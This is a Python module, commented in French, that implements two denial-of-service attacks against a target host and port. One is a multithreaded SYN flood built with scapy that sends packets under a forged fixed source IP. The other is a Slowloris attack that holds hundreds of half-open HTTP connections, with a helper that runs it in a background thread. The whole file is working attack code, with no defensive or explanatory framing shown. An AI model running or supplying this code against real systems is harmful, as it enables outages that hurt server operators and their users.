import threading
import socket, concurrent.futures, time
from scapy.all import IP, TCP, send, RandIP, RandShort


def send_syn_batch(target, dport, count):
    #ip_spoofing = RandIP()
    ip_fixe = "192.168.1.76" # choix d'ip arbitraire
    pkts = [
        IP(dst=target, src=ip_fixe) /
        TCP(sport=RandShort(), dport=dport, flags='S')
        for _ in range(count)
    ]
    send(pkts, verbose=0, inter=0)



def syn_flood(target, port, nb_packets, threads=600):
    packets_per_thread = nb_packets // threads
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(send_syn_batch, target, port, packets_per_thread)
            for _ in range(threads)
        ]
        concurrent.futures.wait(futures)

    duration = time.time() - start_time
    return {
        "nb_succes": nb_packets,
        "nb_echecs": 0,
        "temps": duration
    }
    
    
    
def slowloris_attack(target_ip, target_port, sockets_count=300, sleep_interval=3, duration=None):
    sockets = []
    print(f"[Slowloris] Création de {sockets_count} connexions lentes vers {target_ip}:{target_port}...")

    for i in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
            sockets.append(s)
            if i % 50 == 0 and i > 0:
                print(f"[Slowloris] {i} connexions établies...")
        except socket.error as e:
            print(f"[!] Erreur socket : {e}")
            break

    print(f"[Slowloris] {len(sockets)} connexions établies avec succès")
    print("[Slowloris] Maintien des connexions en vie (keep-alive)...")
    
    # Si une durée est spécifiée, on utilise un timer
    start_time = time.time()
    running = True
    
    while running:
        active_sockets = len(sockets)
        print(f"[Slowloris] Maintien de {active_sockets} connexions actives...")
        
        for s in list(sockets):  # Utiliser une copie pour éviter les erreurs lors de la suppression
            try:
                s.send("X-a: keep-alive\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
                # Détection de perte massive de connexions
                if len(sockets) < active_sockets * 0.7:
                    print("[Slowloris] Perte massive de connexions détectée - possible bannissement!")
        
        # Vérifier si on doit arrêter l'attaque
        if duration and time.time() - start_time >= duration:
            running = False
        else:
            time.sleep(sleep_interval)
    
    # Nettoyage des connexions
    print("[Slowloris] Fermeture des connexions restantes...")
    for s in sockets:
        try:
            s.close()
        except:
            pass
    
    return len(sockets)


def run_slowloris_attack_thread(target_ip, target_port, sockets_count, duration):
    # Permet d'exécuter l'attaque Slowloris dans un thread séparé
    thread = threading.Thread(
        target=slowloris_attack, 
        args=(target_ip, target_port, sockets_count, 3, duration)
    )
    thread.daemon = True
    thread.start()
    return thread